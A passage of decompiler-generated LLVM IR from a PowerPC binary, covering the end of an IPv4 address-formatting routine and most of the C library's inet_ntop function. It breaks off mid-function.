  store i32 %v1_10014cac, i32* %r0.global-to-local, align 4
  %v2_10014cb0 = sub nsw i32 %v3_10014c90, %v1_10014cac
  %v1_10014cb4 = add nsw i32 %v2_10014cb0, 48
  store i32 %v1_10014cb4, i32* %r9.global-to-local, align 4
  %v1_10014cb8 = trunc i32 %v1_10014cb4 to i8
  %v3_10014cb8 = add i32 %v2_10014c98, 8
  %v4_10014cb8 = inttoptr i32 %v3_10014cb8 to i8*
  store i8 %v1_10014cb8, i8* %v4_10014cb8, align 1
  %v0_10014cbc = load i32, i32* %r12.global-to-local, align 4
  %v1_10014cbc = trunc i32 %v0_10014cbc to i8
  %v2_10014cbc = load i32, i32* %r8.global-to-local, align 4
  %v3_10014cbc = add i32 %v2_10014cbc, 8
  %v4_10014cbc = inttoptr i32 %v3_10014cbc to i8*
  store i8 %v1_10014cbc, i8* %v4_10014cbc, align 1
  %v0_10014cc0 = load i32, i32* @r1, align 4
  %v1_10014cc0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014cc0 = add i32 %v1_10014cc0, %v0_10014cc0
  store i32 %v2_10014cc0, i32* %r7.global-to-local, align 4
  %v0_10014cc4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014cc4 = add i32 %v0_10014cc4, -1
  store i32 %v1_10014cc4, i32* %ctr.global-to-local, align 4
  %v2_10014cc4 = icmp eq i32 %v1_10014cc4, 0
  br i1 %v2_10014cc4, label %dec_label_pc_10014cc8, label %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge

dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge: ; preds = %dec_label_pc_10014c90
  %v1_10014c1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10014c1c

dec_label_pc_10014cc8:                            ; preds = %dec_label_pc_10014c90
  %v2_10014cc8 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10014cc8, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10014cd0 = add i32 %v1_10014cc0, %v2_10014cc8
  store i32 %v2_10014cd0, i32* %r9.global-to-local, align 4
  store i32 %v2_10014cc8, i32* @r3, align 4
  %v3_10014cd8 = add i32 %v2_10014cd0, -1
  %v4_10014cd8 = inttoptr i32 %v3_10014cd8 to i8*
  store i8 0, i8* %v4_10014cd8, align 1
  %v0_10014cdc = call i32 @__GI_strlen()
  store i32 %v0_10014cdc, i32* %r3.global-to-local, align 4
  %v1_10014ce0 = load i32, i32* @r30, align 4
  %v3_10014ce0 = icmp ugt i32 %v0_10014cdc, %v1_10014ce0
  br i1 %v3_10014ce0, label %dec_label_pc_10014ce8, label %dec_label_pc_10014cfc

dec_label_pc_10014ce8:                            ; preds = %dec_label_pc_10014cc8
  %v0_10014ce8 = call i32 @__errno_location()
  store i32 %v0_10014ce8, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014cf4 = inttoptr i32 %v0_10014ce8 to i32*
  store i32 28, i32* %v2_10014cf4, align 4
  %v0_10014d10.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014d0c

dec_label_pc_10014cfc:                            ; preds = %dec_label_pc_10014cc8
  %v0_10014cfc = load i32, i32* @r29, align 4
  store i32 %v0_10014cfc, i32* %r3.global-to-local, align 4
  store i32 %v2_10014cc8, i32* %r4.global-to-local, align 4
  %v2_10014d04 = bitcast i16* %stack_var_-56 to i8*
  %v3_10014d04 = call i32 @strcpy(i32 %v0_10014cfc, i8* %v2_10014d04)
  store i32 %v3_10014d04, i32* %r3.global-to-local, align 4
  store i32 %v3_10014d04, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014d0c

dec_label_pc_10014d0c:                            ; preds = %dec_label_pc_10014ce8, %dec_label_pc_10014cfc
  %v0_10014d10 = phi i32 [ %v0_10014d10.pre, %dec_label_pc_10014ce8 ], [ %v3_10014d04, %dec_label_pc_10014cfc ]
  store i32 %v0_10014bc4, i32* %r0.global-to-local, align 4
  store i32 %v0_10014d10, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014d10

; uselistorder directives
  uselistorder i32 %v0_10014d10, { 1, 0 }
  uselistorder i32 %v2_10014cc8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10014cc4, { 1, 0 }
  uselistorder i32 %v2_10014cc0, { 1, 0 }
  uselistorder i32 %v0_10014c94, { 1, 0, 2 }
  uselistorder i32 %v1_10014c58, { 1, 0, 2 }
  uselistorder i32 %v2_10014c48, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10014c34, { 1, 0 }
  uselistorder i32 %v0_10014c20, { 1, 0 }
  uselistorder i32 %v0_10014cc02, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 15, { 0, 3, 5, 6, 1, 8, 9, 7, 2, 4 }
  uselistorder i32 268566528, { 39, 41, 42, 40, 0, 43, 44, 2, 3, 4, 5, 6, 7, 8, 9, 17, 18, 16, 19, 15, 20, 14, 21, 13, 22, 12, 23, 11, 24, 10, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 1 }
  uselistorder label %dec_label_pc_10014d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10014c90, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_10014d24 = icmp slt i32 %arg1, 2
  %v3_10014d24 = icmp eq i32 %arg1, 2
  store i1 %v1_10014d24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014d24, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_10014d24, label %dec_label_pc_10014d54, label %dec_label_pc_10014d48

dec_label_pc_10014d48:                            ; preds = %entry
  %v1_10014d48 = icmp slt i32 %arg1, 10
  %v3_10014d48 = icmp eq i32 %arg1, 10
  store i1 %v1_10014d48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014d48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014d48, label %dec_label_pc_10014d8c.lr.ph, label %dec_label_pc_10014fa0

dec_label_pc_10014d54:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10014d64.1175 to i32), i32* @lr, align 4
  %v3_10014d60 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10014f98

dec_label_pc_10014d8c.lr.ph:                      ; preds = %dec_label_pc_10014d48
  %v2_10014d68 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10014d68, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10014d7c.1176 to i32), i32* @lr, align 4
  %v3_10014d78 = call i32 @__GI_memset(i32 %v2_10014d68, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10014dac15 = load i32, i32* @r27, align 4
  store i32 %v0_10014dac15, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014d8c

dec_label_pc_10014d8c:                            ; preds = %dec_label_pc_10014d8c.lr.ph, %dec_label_pc_10014d8c
  %v1_10014da0 = phi i32 [ 0, %dec_label_pc_10014d8c.lr.ph ], [ %v1_10014db0, %dec_label_pc_10014d8c ]
  %v0_10014d8c = phi i32 [ %v0_10014dac15, %dec_label_pc_10014d8c.lr.ph ], [ %v0_10014dac, %dec_label_pc_10014d8c ]
  %v0_10014d94 = phi i32 [ %v0_10014dac15, %dec_label_pc_10014d8c.lr.ph ], [ %v2_10014dac, %dec_label_pc_10014d8c ]
  %v1_10014d8c = phi i32 [ 0, %dec_label_pc_10014d8c.lr.ph ], [ %v0_10014da4, %dec_label_pc_10014d8c ]
  %v2_10014d8c = add i32 %v0_10014d8c, %v1_10014d8c
  %v3_10014d8c = inttoptr i32 %v2_10014d8c to i8*
  %v4_10014d8c = load i8, i8* %v3_10014d8c, align 1
  %v5_10014d8c = zext i8 %v4_10014d8c to i32
  %v1_10014d90 = add i32 %v1_10014d8c, 2
  store i32 %v1_10014d90, i32* %r11.global-to-local, align 4
  %v1_10014d94 = add i32 %v0_10014d94, 1
  %v2_10014d94 = inttoptr i32 %v1_10014d94 to i8*
  %v3_10014d94 = load i8, i8* %v2_10014d94, align 1
  %v4_10014d94 = zext i8 %v3_10014d94 to i32
  %v1_10014d98 = mul nuw nsw i32 %v5_10014d8c, 256
  %v2_10014d9c = or i32 %v4_10014d94, %v1_10014d98
  %v2_10014da0 = load i32, i32* %r29.global-to-local, align 4
  %v3_10014da0 = add i32 %v2_10014da0, %v1_10014da0
  %v4_10014da0 = inttoptr i32 %v3_10014da0 to i32*
  store i32 %v2_10014d9c, i32* %v4_10014da0, align 4
  %v0_10014da4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014da4 = udiv i32 %v0_10014da4, 2
  %v0_10014dac = load i32, i32* @r27, align 4
  %v2_10014dac = add i32 %v0_10014dac, %v0_10014da4
  store i32 %v2_10014dac, i32* %r9.global-to-local, align 4
  %v1_10014db0 = mul i32 %v1_10014da4, 4
  %v0_10014db4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014db4 = add i32 %v0_10014db4, -1
  store i32 %v1_10014db4, i32* %ctr.global-to-local, align 4
  %v2_10014db4 = icmp eq i32 %v1_10014db4, 0
  br i1 %v2_10014db4, label %dec_label_pc_10014dd4.lr.ph, label %dec_label_pc_10014d8c

dec_label_pc_10014dd4.lr.ph:                      ; preds = %dec_label_pc_10014d8c
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014dd4

dec_label_pc_10014dd4:                            ; preds = %dec_label_pc_10014dd4.lr.ph, %dec_label_pc_10014e20
  %v0_10014e24 = phi i32 [ 8, %dec_label_pc_10014dd4.lr.ph ], [ %v1_10014e24, %dec_label_pc_10014e20 ]
  %v0_10014e14 = phi i32 [ -1, %dec_label_pc_10014dd4.lr.ph ], [ %v0_10014e1442, %dec_label_pc_10014e20 ]
  %v0_10014e04 = phi i32 [ -1, %dec_label_pc_10014dd4.lr.ph ], [ %v0_10014e0439, %dec_label_pc_10014e20 ]
  %v0_10014dd8 = phi i32 [ -1, %dec_label_pc_10014dd4.lr.ph ], [ %v0_10014dd835, %dec_label_pc_10014e20 ]
  %v0_10014e20 = phi i32 [ 0, %dec_label_pc_10014dd4.lr.ph ], [ %v1_10014e20, %dec_label_pc_10014e20 ]
  %v1_10014dd4 = mul i32 %v0_10014e20, 4
  %v3_10014dd8 = icmp eq i32 %v0_10014dd8, -1
  %v2_10014ddc = add i32 %v1_10014dd4, %v2_10014d68
  %v3_10014ddc = inttoptr i32 %v2_10014ddc to i32*
  %v4_10014ddc = load i32, i32* %v3_10014ddc, align 4
  %v3_10014de0 = icmp eq i32 %v4_10014ddc, 0
  br i1 %v3_10014de0, label %dec_label_pc_10014de8, label %dec_label_pc_10014e00

dec_label_pc_10014de8:                            ; preds = %dec_label_pc_10014dd4
  br i1 %v3_10014dd8, label %dec_label_pc_10014dec, label %dec_label_pc_10014df8

dec_label_pc_10014dec:                            ; preds = %dec_label_pc_10014de8
  store i32 %v0_10014e20, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10014e20

dec_label_pc_10014df8:                            ; preds = %dec_label_pc_10014de8
  %v0_10014df8 = load i32, i32* @r31, align 4
  %v1_10014df8 = add i32 %v0_10014df8, 1
  store i32 %v1_10014df8, i32* @r31, align 4
  br label %dec_label_pc_10014e20

dec_label_pc_10014e00:                            ; preds = %dec_label_pc_10014dd4
  br i1 %v3_10014dd8, label %dec_label_pc_10014e20, label %dec_label_pc_10014e04

dec_label_pc_10014e04:                            ; preds = %dec_label_pc_10014e00
  %v3_10014e04 = icmp eq i32 %v0_10014e04, -1
  %v0_10014e18.pre = load i32, i32* @r31, align 4
  %v1_10014e0c = load i32, i32* @r30, align 4
  %v3_10014e0c = icmp sgt i32 %v0_10014e18.pre, %v1_10014e0c
  %or.cond = or i1 %v3_10014e04, %v3_10014e0c
  br i1 %or.cond, label %dec_label_pc_10014e14, label %dec_label_pc_10014e1c

dec_label_pc_10014e14:                            ; preds = %dec_label_pc_10014e04
  store i32 %v0_10014e14, i32* @r28, align 4
  store i32 %v0_10014e18.pre, i32* @r30, align 4
  br label %dec_label_pc_10014e1c

dec_label_pc_10014e1c:                            ; preds = %dec_label_pc_10014e04, %dec_label_pc_10014e14
  %v0_10014e0440 = phi i32 [ %v0_10014e14, %dec_label_pc_10014e14 ], [ %v0_10014e04, %dec_label_pc_10014e04 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014e20

dec_label_pc_10014e20:                            ; preds = %dec_label_pc_10014e00, %dec_label_pc_10014df8, %dec_label_pc_10014dec, %dec_label_pc_10014e1c
  %v0_10014e1442 = phi i32 [ %v0_10014e14, %dec_label_pc_10014e00 ], [ %v0_10014e14, %dec_label_pc_10014df8 ], [ %v0_10014e20, %dec_label_pc_10014dec ], [ -1, %dec_label_pc_10014e1c ]
  %v0_10014dd835 = phi i32 [ -1, %dec_label_pc_10014e00 ], [ %v0_10014dd8, %dec_label_pc_10014df8 ], [ %v0_10014e20, %dec_label_pc_10014dec ], [ -1, %dec_label_pc_10014e1c ]
  %v0_10014e0439 = phi i32 [ %v0_10014e04, %dec_label_pc_10014e00 ], [ %v0_10014e04, %dec_label_pc_10014df8 ], [ %v0_10014e04, %dec_label_pc_10014dec ], [ %v0_10014e0440, %dec_label_pc_10014e1c ]
  %v1_10014e20 = add nuw nsw i32 %v0_10014e20, 1
  store i32 %v1_10014e20, i32* %r11.global-to-local, align 4
  %v1_10014e24 = add nsw i32 %v0_10014e24, -1
  store i32 %v1_10014e24, i32* %ctr.global-to-local, align 4
  %v2_10014e24 = icmp eq i32 %v1_10014e24, 0
  br i1 %v2_10014e24, label %dec_label_pc_10014e28, label %dec_label_pc_10014dd4

dec_label_pc_10014e28:                            ; preds = %dec_label_pc_10014e20
  %v3_10014e28 = icmp eq i32 %v0_10014e1442, -1
  %v1_10014e48 = icmp slt i32 %v0_10014e0439, -1
  %v3_10014e48 = icmp eq i32 %v0_10014e0439, -1
  store i1 %v1_10014e48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014e28, label %dec_label_pc_10014e48, label %dec_label_pc_10014e30

dec_label_pc_10014e30:                            ; preds = %dec_label_pc_10014e28
  %v0_10014e40.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014e48, label %dec_label_pc_10014e40, label %dec_label_pc_10014e38

dec_label_pc_10014e38:                            ; preds = %dec_label_pc_10014e30
  %v1_10014e38 = load i32, i32* @r30, align 4
  %v2_10014e38 = icmp slt i32 %v0_10014e40.pre, %v1_10014e38
  %v3_10014e38 = icmp sgt i32 %v0_10014e40.pre, %v1_10014e38
  %v4_10014e38 = icmp eq i32 %v0_10014e40.pre, %v1_10014e38
  store i1 %v2_10014e38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014e38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014e38, label %dec_label_pc_10014e40, label %dec_label_pc_10014e48.thread

dec_label_pc_10014e40:                            ; preds = %dec_label_pc_10014e30, %dec_label_pc_10014e38
  store i32 %v0_10014e40.pre, i32* @r30, align 4
  store i32 %v0_10014e1442, i32* @r28, align 4
  br label %dec_label_pc_10014e48.thread

dec_label_pc_10014e48.thread:                     ; preds = %dec_label_pc_10014e40, %dec_label_pc_10014e38
  %v0_10014e5076 = phi i32 [ %v1_10014e38, %dec_label_pc_10014e38 ], [ %v0_10014e40.pre, %dec_label_pc_10014e40 ]
  %v0_10014e48.ph = phi i32 [ %v0_10014e0439, %dec_label_pc_10014e38 ], [ %v0_10014e1442, %dec_label_pc_10014e40 ]
  %v1_10014e4859 = icmp slt i32 %v0_10014e48.ph, -1
  %v3_10014e4861 = icmp eq i32 %v0_10014e48.ph, -1
  store i1 %v1_10014e4859, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e4861, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014e50

dec_label_pc_10014e48:                            ; preds = %dec_label_pc_10014e28
  br i1 %v3_10014e48, label %dec_label_pc_10014e5c, label %dec_label_pc_10014e48.dec_label_pc_10014e50_crit_edge

dec_label_pc_10014e48.dec_label_pc_10014e50_crit_edge: ; preds = %dec_label_pc_10014e48
  %v0_10014e50.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014e50

dec_label_pc_10014e50:                            ; preds = %dec_label_pc_10014e48.dec_label_pc_10014e50_crit_edge, %dec_label_pc_10014e48.thread
  %v0_10014e50 = phi i32 [ %v0_10014e5076, %dec_label_pc_10014e48.thread ], [ %v0_10014e50.pre, %dec_label_pc_10014e48.dec_label_pc_10014e50_crit_edge ]
  %v0_10014e4862 = phi i32 [ %v0_10014e48.ph, %dec_label_pc_10014e48.thread ], [ %v0_10014e0439, %dec_label_pc_10014e48.dec_label_pc_10014e50_crit_edge ]
  %v1_10014e50 = icmp slt i32 %v0_10014e50, 1
  %v2_10014e50 = icmp sgt i32 %v0_10014e50, 1
  %v3_10014e50 = icmp eq i32 %v0_10014e50, 1
  store i1 %v1_10014e50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014e50, label %dec_label_pc_10014e5c, label %dec_label_pc_10014e58

dec_label_pc_10014e58:                            ; preds = %dec_label_pc_10014e50
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014e5c

dec_label_pc_10014e5c:                            ; preds = %dec_label_pc_10014e50, %dec_label_pc_10014e48, %dec_label_pc_10014e58
  %v0_10014e683 = phi i32 [ %v0_10014e4862, %dec_label_pc_10014e50 ], [ -1, %dec_label_pc_10014e48 ], [ -1, %dec_label_pc_10014e58 ]
  %v2_10014e5c = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10014e5c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_10014e684 = icmp slt i32 %v0_10014e683, -1
  %v3_10014e686 = icmp eq i32 %v0_10014e683, -1
  store i1 %v1_10014e684, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e686, i1* %cr7_eq.global-to-local, align 1
  %v2_10014ed8 = icmp slt i32 %tmp, 65535
  %v4_10014ed8 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10014e68

dec_label_pc_10014e68:                            ; preds = %dec_label_pc_10014e5c, %dec_label_pc_10014f34
  %v2_10014ea4 = phi i32 [ %v2_10014e5c, %dec_label_pc_10014e5c ], [ %v2_10014e8c51, %dec_label_pc_10014f34 ]
  %v0_10014e78 = phi i32 [ %v0_10014e683, %dec_label_pc_10014e5c ], [ %v0_10014e68, %dec_label_pc_10014f34 ]
  %v0_10014e98 = phi i32 [ 0, %dec_label_pc_10014e5c ], [ %v1_10014f34, %dec_label_pc_10014f34 ]
  %v3_10014e687 = phi i1 [ %v3_10014e686, %dec_label_pc_10014e5c ], [ %v3_10014e68, %dec_label_pc_10014f34 ]
  br i1 %v3_10014e687, label %dec_label_pc_10014e98, label %dec_label_pc_10014e70

dec_label_pc_10014e70:                            ; preds = %dec_label_pc_10014e68
  %v2_10014e70 = icmp slt i32 %v0_10014e98, %v0_10014e78
  %v4_10014e70 = icmp eq i32 %v0_10014e98, %v0_10014e78
  br i1 %v2_10014e70, label %dec_label_pc_10014e98, label %dec_label_pc_10014e78

dec_label_pc_10014e78:                            ; preds = %dec_label_pc_10014e70
  %v1_10014e78 = load i32, i32* @r30, align 4
  %v2_10014e78 = add i32 %v1_10014e78, %v0_10014e78
  %v2_10014e7c = icmp slt i32 %v0_10014e98, %v2_10014e78
  %v4_10014e7c = icmp eq i32 %v0_10014e98, %v2_10014e78
  store i1 %v2_10014e7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014e7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014e7c, label %dec_label_pc_10014e84, label %dec_label_pc_10014e98

dec_label_pc_10014e84:                            ; preds = %dec_label_pc_10014e78
  br i1 %v4_10014e70, label %dec_label_pc_10014e88, label %dec_label_pc_10014f34

dec_label_pc_10014e88:                            ; preds = %dec_label_pc_10014e84
  %v3_10014e8c = inttoptr i32 %v2_10014ea4 to i8*
  store i8 58, i8* %v3_10014e8c, align 1
  %v0_10014e90 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014e90 = add i32 %v0_10014e90, 1
  store i32 %v1_10014e90, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f34

dec_label_pc_10014e98:                            ; preds = %dec_label_pc_10014e78, %dec_label_pc_10014e70, %dec_label_pc_10014e68
  %v1_10014e98 = icmp slt i32 %v0_10014e98, 0
  %v3_10014e98 = icmp eq i32 %v0_10014e98, 0
  store i1 %v1_10014e98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014e98, label %dec_label_pc_10014eac.thread, label %dec_label_pc_10014eac

dec_label_pc_10014eac.thread:                     ; preds = %dec_label_pc_10014e98
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014f10

dec_label_pc_10014eac:                            ; preds = %dec_label_pc_10014e98
  %v3_10014ea4 = inttoptr i32 %v2_10014ea4 to i8*
  store i8 58, i8* %v3_10014ea4, align 1
  %v0_10014ea8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014ea8 = add i32 %v0_10014ea8, 1
  store i32 %v1_10014ea8, i32* %r29.global-to-local, align 4
  %v0_10014eac.pre = load i32, i32* @r31, align 4
  %v1_10014eac = icmp slt i32 %v0_10014eac.pre, 6
  %v3_10014eac = icmp eq i32 %v0_10014eac.pre, 6
  store i1 %v1_10014eac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014eac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014eac, label %dec_label_pc_10014eb4, label %dec_label_pc_10014f10

dec_label_pc_10014eb4:                            ; preds = %dec_label_pc_10014eac
  %v0_10014eb4 = load i32, i32* @r28, align 4
  %v1_10014eb4 = icmp slt i32 %v0_10014eb4, 0
  %v3_10014eb4 = icmp eq i32 %v0_10014eb4, 0
  store i1 %v1_10014eb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014eb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014eb4, label %dec_label_pc_10014ebc, label %dec_label_pc_10014f10

dec_label_pc_10014ebc:                            ; preds = %dec_label_pc_10014eb4
  %v0_10014ebc = load i32, i32* @r30, align 4
  %v1_10014ebc = icmp slt i32 %v0_10014ebc, 6
  %v3_10014ebc = icmp eq i32 %v0_10014ebc, 6
  store i1 %v1_10014ebc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ebc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ebc, label %dec_label_pc_10014ee0, label %dec_label_pc_10014ec4

dec_label_pc_10014ec4:                            ; preds = %dec_label_pc_10014ebc
  %v1_10014ec4 = icmp slt i32 %v0_10014ebc, 5
  %v3_10014ec4 = icmp eq i32 %v0_10014ebc, 5
  store i1 %v1_10014ec4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ec4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ec4, label %dec_label_pc_10014ecc, label %dec_label_pc_10014f10

dec_label_pc_10014ecc:                            ; preds = %dec_label_pc_10014ec4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10014ed8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014ed8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014ed8, label %dec_label_pc_10014ee0, label %dec_label_pc_10014f10

dec_label_pc_10014ee0:                            ; preds = %dec_label_pc_10014ecc, %dec_label_pc_10014ebc
  %v1_10014ee0 = load i32, i32* @r1, align 4
  %v2_10014ee0 = sub i32 %v1_10014ee0, %v1_10014ea8
  %v0_10014ee4 = load i32, i32* @r27, align 4
  %v1_10014ee4 = add i32 %v0_10014ee4, 12
  %v1_10014ee8 = add i32 %v2_10014ee0, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10014ef4.1177 to i32), i32* @lr, align 4
  %v3_10014ef0 = call i32 @inet_ntop4(i32 %v1_10014ee4, i32 %v1_10014ea8, i32 %v1_10014ee8)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10014ef8 = icmp slt i32 %v3_10014ef0, 0
  %v3_10014ef8 = icmp eq i32 %v3_10014ef0, 0
  store i1 %v1_10014ef8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ef8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ef8, label %dec_label_pc_10014fb0, label %dec_label_pc_10014f00

dec_label_pc_10014f00:                            ; preds = %dec_label_pc_10014ee0
  %v0_10014f00 = load i32, i32* @r29, align 4
  store i32 %v0_10014f00, i32* @r3, align 4
  %v0_10014f04 = call i32 @__GI_strlen()
  %v0_10014f08 = load i32, i32* @r29, align 4
  %v2_10014f08 = add i32 %v0_10014f08, %v0_10014f04
  store i32 %v2_10014f08, i32* %r29.global-to-local, align 4
  %v0_10014f48.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10014f48

dec_label_pc_10014f10:                            ; preds = %dec_label_pc_10014eac.thread, %dec_label_pc_10014ecc, %dec_label_pc_10014ec4, %dec_label_pc_10014eb4, %dec_label_pc_10014eac
  %v0_10014f1067 = phi i32 [ 0, %dec_label_pc_10014eac.thread ], [ 6, %dec_label_pc_10014ecc ], [ 6, %dec_label_pc_10014ec4 ], [ 6, %dec_label_pc_10014eb4 ], [ %v0_10014eac.pre, %dec_label_pc_10014eac ]
  %v0_10014eec66 = phi i32 [ %v2_10014ea4, %dec_label_pc_10014eac.thread ], [ %v1_10014ea8, %dec_label_pc_10014ecc ], [ %v1_10014ea8, %dec_label_pc_10014ec4 ], [ %v1_10014ea8, %dec_label_pc_10014eb4 ], [ %v1_10014ea8, %dec_label_pc_10014eac ]
  %v1_10014f10 = mul i32 %v0_10014f1067, 4
  store i32 %v2_10014d68, i32* %r9.global-to-local, align 4
  %v2_10014f18 = add i32 %v1_10014f10, %v2_10014d68
  %v3_10014f18 = inttoptr i32 %v2_10014f18 to i32*
  %v4_10014f18 = load i32, i32* %v3_10014f18, align 4
  store i32 %v0_10014eec66, i32* @r3, align 4
  store i32 268521264, i32* @lr, align 4
  %v5_10014f2c = call i32 @sprintf(i32 %v0_10014eec66, i32 ptrtoint ([3 x i8]* @global_var_1001c37c.1178 to i32), i32 %v4_10014f18, i32 %v2_10014d68)
  %v0_10014f30 = load i32, i32* @r29, align 4
  %v2_10014f30 = add i32 %v0_10014f30, %v5_10014f2c
  store i32 %v2_10014f30, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f34

dec_label_pc_10014f34:                            ; preds = %dec_label_pc_10014e84, %dec_label_pc_10014e88, %dec_label_pc_10014f10
  %v2_10014e8c51 = phi i32 [ %v2_10014ea4, %dec_label_pc_10014e84 ], [ %v1_10014e90, %dec_label_pc_10014e88 ], [ %v2_10014f30, %dec_label_pc_10014f10 ]
  %v0_10014f34 = load i32, i32* @r31, align 4
  %v1_10014f34 = add i32 %v0_10014f34, 1
  store i32 %v1_10014f34, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_10014f34, 8
  %v0_10014e68 = load i32, i32* @r28, align 4
  %v1_10014e68 = icmp slt i32 %v0_10014e68, -1
  %v3_10014e68 = icmp eq i32 %v0_10014e68, -1
  store i1 %v1_10014e68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e68, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10014e68, label %dec_label_pc_10014f40

dec_label_pc_10014f40:                            ; preds = %dec_label_pc_10014f34
  br i1 %v3_10014e68, label %dec_label_pc_10014f60, label %dec_label_pc_10014f48

dec_label_pc_10014f48:                            ; preds = %dec_label_pc_10014f40, %dec_label_pc_10014f00
  %v2_10014f58 = phi i32 [ %v2_10014e8c51, %dec_label_pc_10014f40 ], [ %v2_10014f08, %dec_label_pc_10014f00 ]
  %v0_10014f48 = phi i32 [ %v0_10014e68, %dec_label_pc_10014f40 ], [ %v0_10014f48.pre, %dec_label_pc_10014f00 ]
  %v1_10014f48 = load i32, i32* @r30, align 4
  %v2_10014f48 = add i32 %v1_10014f48, %v0_10014f48
